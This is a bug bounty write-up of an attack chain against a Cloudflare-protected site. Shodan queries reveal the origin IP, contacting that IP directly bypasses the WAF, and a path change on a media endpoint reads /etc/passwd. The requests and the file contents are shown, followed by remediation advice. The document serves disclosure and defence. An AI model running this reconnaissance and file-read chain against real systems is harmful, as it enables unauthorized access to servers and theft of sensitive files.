# 🔐 Bug Bounty Writeup
## Local File Inclusion via Origin IP Disclosure & Cloudflare WAF Bypass

> **High / Critical Severity** · Web Application Security · LFI · WAF Bypass

---

## 📌 Finding at a Glance

| Field | Details |
|---|---|
| **Vulnerability** | Local File Inclusion (LFI) |
| **Attack Chain** | Origin IP Disclosure → Direct Origin Access → LFI |
| **Protection** | Cloudflare WAF |
| **Affected Component** | Video/media resource endpoint |
| **Impact** | Sensitive local file disclosure |
| **Severity** | 🔴 High / Critical |

---

## 🧭 Attack Chain

```text
┌────────────────────┐
│ Target Web App     │
│ Behind Cloudflare  │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│ WAF Identification │
│    wafw00f         │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│ Origin IP Discovery│
│     Shodan         │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│ Direct Origin      │
│ Access             │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│ Vulnerable Media   │
│ Endpoint           │
└─────────┬──────────┘
          │
          ▼
┌────────────────────┐
│ LFI                │
│ /etc/passwd        │
└────────────────────┘
```

---

# 1. 📝 Executive Summary

During a bug bounty assessment, a vulnerability chain was discovered that allowed an attacker to bypass the target application's **Cloudflare Web Application Firewall (WAF)**.

Passive reconnaissance revealed the backend server's direct **Origin IP address**. Because the origin accepted direct connections instead of restricting traffic to Cloudflare, requests could be sent directly to the backend and bypass the WAF.

Further testing of an unprotected subdomain hosted on the same origin revealed a media endpoint vulnerable to **Local File Inclusion (LFI)**. The vulnerability allowed arbitrary local system files such as `/etc/passwd` to be read from the underlying Linux server.

### 🎯 Core Security Issue

> **The Cloudflare WAF was not sufficient to protect the backend because the origin server remained directly accessible.**

---

# 2. 🔎 Vulnerability Details

### Affected Security Layers

- **WAF:** Cloudflare
- **Vulnerability:** Local File Inclusion (LFI)
- **Attack Vector:** Direct origin access
- **Vulnerable Component:** Video/media resource parameter
- **Operating System:** Linux
- **Potential Impact:** Sensitive file disclosure and possible further exploitation

### Why the Chain Matters

The individual weaknesses become significantly more serious when combined:

**Origin IP Exposure + Unrestricted Origin Access + LFI**

This creates a path from external reconnaissance to direct backend interaction and ultimately sensitive file disclosure.

---

# 3. 🧪 Proof of Concept

## Step 1 — WAF Identification & Reconnaissance

Initial reconnaissance indicated that the main application was protected by Cloudflare WAF.

```bash
# Verify WAF presence on the target domain
$ wafw00f https://target.com

[*] The site https://target.com is behind Cloudflare WAF.
```

### Observation

The application was protected by a Cloudflare security layer, so further testing focused on identifying whether the backend could be reached independently.

---

## Step 2 — Origin IP Discovery

Passive reconnaissance was performed to identify the backend origin associated with the target.

**Tool:** Shodan

**Example search queries:**

```text
ssl:"target.com"
hostname:"target.com"
```

**Result:**

```text
Exposed backend server IP:
[REDACTED_ORIGIN_IP]
```

> ⚠️ **Sensitive Data:** The actual origin IP has been redacted from this writeup.

---

## Step 3 — WAF Bypass Verification

The discovered origin was tested directly.

```bash
# Test the origin directly
$ wafw00f http://[REDACTED_ORIGIN_IP]

[*] No WAF detected on http://[REDACTED_ORIGIN_IP]
```

### Result

The backend could be contacted without passing through Cloudflare.

```text
Internet
   │
   ▼
Cloudflare WAF  ────────► Protected Application
   │
   │  Bypass
   ▼
Origin IP ──────────────► Backend Server
```

This demonstrated that the origin server was independently reachable.

---

# 4. 🎥 Endpoint Discovery

Direct access to the origin exposed an unhedged media-rendering service.

The video gallery was inspected and the media request was intercepted using **Burp Suite**.

### Original Request

```http
GET /media/play?video=sample_intro.mp4 HTTP/1.1
Host: [REDACTED_ORIGIN_IP]
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: */*
```

The endpoint accepted a resource supplied through the request and returned media content.

---

# 5. 🚨 LFI Validation

The media resource path was modified to test whether the application could access a local system file.

### Modified Request

```http
GET /media/etc/passwd HTTP/1.1
Host: [REDACTED_ORIGIN_IP]
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Accept: */*
```

### Server Response

```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 1482
```

The response contained Linux account information from `/etc/passwd`, confirming local file disclosure.

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

---

# 6. 💥 Impact Analysis

### 🔴 1. Sensitive File Disclosure

An attacker may be able to read arbitrary files accessible to the web application process, potentially including:

- `/etc/passwd`
- Application configuration files
- Environment files
- Environment variables
- API credentials
- Database connection information

The exact impact depends on the application's filesystem permissions and deployment configuration.

### 🔴 2. WAF Protection Bypass

Because the origin server accepted direct requests, an attacker could potentially interact with backend services without passing through Cloudflare's edge protection.

### 🟠 3. Potential Escalation

Depending on the application's configuration and available primitives, LFI can sometimes become a stepping stone toward more severe impact.

Examples may include log-file injection or access to process/environment information.

> **Important:** Further escalation should only be claimed when it is actually demonstrated during testing.

---

# 7. 🛠️ Remediation

## A. 🔒 Protect the Origin Server

The origin should not accept arbitrary Internet traffic.

Recommended controls:

- Allow inbound traffic only from Cloudflare's published IP ranges.
- Use firewall/security-group rules at the origin.
- Consider **Authenticated Origin Pulls / mTLS** where appropriate.
- Remove unnecessary public exposure of backend services.

### Goal

```text
Internet
   │
   ▼
Cloudflare
   │
   ▼
Origin Firewall
   │
   ▼
Application Server
```

Direct:

```text
Internet ───X───► Origin Server
```

---

## B. 🧹 Validate File Parameters

Do not pass user-controlled values directly into filesystem functions.

Prefer:

- Strict allowlists
- Fixed resource identifiers
- Server-side mapping of IDs → filenames
- Canonical path validation
- Rejection of traversal sequences
- Least-privilege filesystem permissions

### Safer Design

```text
User Input
    │
    ▼
Validation
    │
    ▼
Allowlisted Resource ID
    │
    ▼
Server-side File Mapping
    │
    ▼
Requested Resource
```

---

# 8. 📊 Risk Summary

| Security Area | Result |
|---|---|
| Origin Exposure | 🔴 High |
| WAF Bypass | 🔴 High |
| Local File Inclusion | 🔴 High |
| Sensitive File Disclosure | 🔴 High |
| RCE | 🟠 Potential / Not demonstrated |
| Overall Risk | 🔴 High / Critical |

---

# 9. 🧾 Conclusion

This finding demonstrates how multiple weaknesses can combine into a significant security issue.

The primary chain was:

```text
Origin IP Disclosure
        ↓
Direct Origin Access
        ↓
Cloudflare WAF Bypass
        ↓
Unprotected Media Endpoint
        ↓
Local File Inclusion
        ↓
Sensitive File Disclosure
```

The most important remediation is to **secure the origin server itself** and ensure that application endpoints never treat untrusted input as a filesystem path.

---

## 🛡️ Security Takeaway

> **A WAF cannot fully protect an application if attackers can bypass the WAF and reach the origin directly.**

The backend should enforce its own access controls, while file-handling endpoints should use strict allowlisting rather than trusting user-supplied paths.

---

### ⚠️ Responsible Disclosure

This writeup is intended for authorized security testing and responsible vulnerability disclosure. Sensitive identifiers such as real origin IP addresses should be redacted before publication.

